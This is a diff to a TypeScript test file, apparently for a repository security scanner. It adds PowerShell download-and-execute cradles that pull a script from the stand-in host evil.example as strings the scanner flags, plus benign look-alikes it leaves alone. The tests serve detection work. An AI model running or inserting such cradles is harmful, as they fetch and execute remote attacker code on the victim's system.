@@ -49,6 +49,12 @@ const CRADLES: Record<string, string> = {
     '[powershell]::Create().AddScript((irm "https://evil.example/i.ps1"))',
   "$runspace.AddScript((New-Object Net.WebClient).DownloadString ...)":
     '$runspace.AddScript((New-Object Net.WebClient).DownloadString("https://evil.example/i.ps1"))',
+  "iex $wc.DownloadString(...) in command mode":
+    'iex $wc.DownloadString("https://evil.example/i.ps1")',
+  "Invoke-Expression $client.DownloadString(...) in command mode":
+    'Invoke-Expression $client.DownloadString("https://evil.example/i.ps1")',
+  "[powershell]::Create().AddScript( (irm ...) ) with inner whitespace":
+    '[powershell]::Create().AddScript( (irm "https://evil.example/i.ps1") )',
 };
 
 test("powershell cradles downloading and executing code are unsafe execution", () => {
@@ -85,6 +91,9 @@ test("benign powershell commands keep no unsafe-execution finding", () => {
     "$sb = [powershell]::Create(); $sb.AddScript((Get-Content ./local.ps1 -Raw))",
     "iex ($code.ToString())",
     "[powershell]::Create().AddScript((Get-Command ./tool.ps1).ScriptContents)",
+    '[powershell]::Create().AddScript("Write-Host ok; # see client.DownloadString(url)")',
+    "build_iex(irm_config)",
+    "iex(iwr_timeout)",
   ]) {
     const inspection = inspectRepository({
       files: [
